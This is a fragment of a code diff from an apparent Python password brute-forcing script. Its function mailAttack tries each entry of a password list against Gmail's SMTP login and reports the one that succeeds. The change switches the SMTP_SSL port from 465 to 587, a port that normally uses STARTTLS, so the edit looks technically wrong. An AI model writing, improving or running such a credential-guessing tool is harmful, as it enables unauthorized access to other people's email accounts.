@@ -105,7 +105,7 @@ def mailAttack():#Mail saldirisi yapan fonksiyon
         i = i + 1
         pass_count = str(i) + '-' + str(len(pass_list))
         try:
-            server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
+            server = smtplib.SMTP_SSL("smtp.gmail.com", 587)
             server.ehlo()
             server.login(user_name, password)
             print ("[INFO]: Login Succesfuly, password :" + password)
